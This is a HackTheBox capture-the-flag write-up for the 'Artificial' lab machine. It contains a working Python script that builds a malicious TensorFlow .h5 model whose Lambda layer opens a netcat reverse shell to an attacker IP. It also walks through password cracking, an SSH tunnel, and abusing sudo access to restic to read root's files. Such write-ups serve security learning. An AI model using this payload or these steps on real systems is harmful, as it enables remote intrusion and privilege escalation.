# HackTheBox: Artificial – Writeup
Artificial is an easy Linux machine where attackers gain RCE through a malicious TensorFlow model upload, crack user credentials, and escalate to root by abusing sudo access to the restic backup tool.

## Enumeration

### Nmap scan

The nmap scan shows port 22(ssh) and port 80(apache web server) open.

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-27 20:52 +04
Nmap scan report for artificial.htb (10.10.11.74)
Host is up (0.25s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 7c:e4:8d:84:c5:de:91:3a:5a:2b:9d:34:ed:d6:99:17 (RSA)
|   256 83:46:2d:cf:73:6d:28:6f:11:d5:1d:b4:88:20:d6:7c (ECDSA)
|_  256 e3:18:2e:3b:40:61:b4:59:87:e8:4a:29:24:0f:6a:fc (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Artificial - AI Solutions
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.71 seconds
```

## Initial foothold

Using a directory enumerator, such as ffuf/gobuster we come across the register page, and register an account.

![Image Alt](https://github.com/mfahdk/Writeups/blob/main/HackTheBox/Artificial/Screenshots/1.png)

Upon registering, we are directed to the dashboard, where we're able to upload files. Hmmmm... possible RCE through file upload, but it doesn't work since .h5 files are supposed to be uploaded. 

![Image Alt](https://github.com/mfahdk/Writeups/blob/main/HackTheBox/Artificial/Screenshots/2.png)

The model can be built using the dockerfile, hosting python v3.12, and is much easier than setting up in your machine. 

![Image Alt](https://github.com/mfahdk/Writeups/blob/main/HackTheBox/Artificial/Screenshots/3.png)

### RCE using tensorflow

The following payload is used, to spawn in a reverse shell, which can also be found [here](https://github.com/Splinter0/tensorflow-rce/blob/main/exploit.py)

```
import tensorflow as tf

def exploit(x):
    import os
    os.system("rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.226 1234 >/tmp/f")
    return x

model = tf.keras.Sequential()
model.add(tf.keras.layers.Input(shape=(64,)))
model.add(tf.keras.layers.Lambda(exploit))
model.compile()
model.save("exploit.h5")
```

This code creates a TensorFlow model that, when loaded or run, triggers a reverse shell to an attacker's machine using a malicious Lambda layer.

![Image Alt](https://github.com/mfahdk/Writeups/blob/main/HackTheBox/Artificial/Screenshots/4.png)

This malicious payload is run on the docker container and its file is copied from the container to the kali machine, using the commands;

```
sudo docker ps
sudo docker cp d41c59ca2285:/code/exploit.h5 .
```

Then the generated h5 file is uploaded and a netcat listener is opened.

![Image Alt](https://github.com/mfahdk/Writeups/blob/main/HackTheBox/Artificial/Screenshots/6.png)

Enumerating through the user, a SQL database file is found containing the usernames and passwords of all the users logged into the web page.

### Password Cracking

Using hashcat, all those passwords are cracked.

![Image Alt](https://github.com/mfahdk/Writeups/blob/main/HackTheBox/Artificial/Screenshots/8.png)

Checking through them, 'gael' is the only user that has access to SSH.

![Image Alt](https://github.com/mfahdk/Writeups/blob/main/HackTheBox/Artificial/Screenshots/9.png)

User flag has been obtained and Linpeas has been used to enumerate the user.

## Privilege Escalation

![Image Alt](https://github.com/mfahdk/Writeups/blob/main/HackTheBox/Artificial/Screenshots/10.png)

Giving us a backrest backups files, containing a hashed password, along with an open port '9898'.

![Image Alt](https://github.com/mfahdk/Writeups/blob/main/HackTheBox/Artificial/Screenshots/11.png)

![Image Alt](https://github.com/mfahdk/Writeups/blob/main/HackTheBox/Artificial/Screenshots/12.png)

This command is used to SSH tunnel, to host the port 9898, locally;

```
ssh -L 5000:localhost:5000 gael@10.10.11.74
```

The hashed password is cracked, likely the root account of the backrest api being hosted on the port 9898.

![Image Alt](https://github.com/mfahdk/Writeups/blob/main/HackTheBox/Artificial/Screenshots/13.png)

![Image Alt](https://github.com/mfahdk/Writeups/blob/main/HackTheBox/Artificial/Screenshots/14.png)

Logging in as root, we are able to run restic commands as root which will enable us to read out contents of root flag.

Restic is an open-source backup application that works by creating a new repository, where you're able to backup the files.

![Image Alt](https://github.com/mfahdk/Writeups/blob/main/HackTheBox/Artificial/Screenshots/15.png)

Since we have sudo perms to run restic, we can initialize a repo, add the root.txt in backup, and then dump it, to obtain its contents, using the following commands;

```
restic init -r test
backup -r test /root/root.txt
-r test ls latest
-r test dump latest /root/root.txt
```

![Image Alt](https://github.com/mfahdk/Writeups/blob/main/HackTheBox/Artificial/Screenshots/16.png)
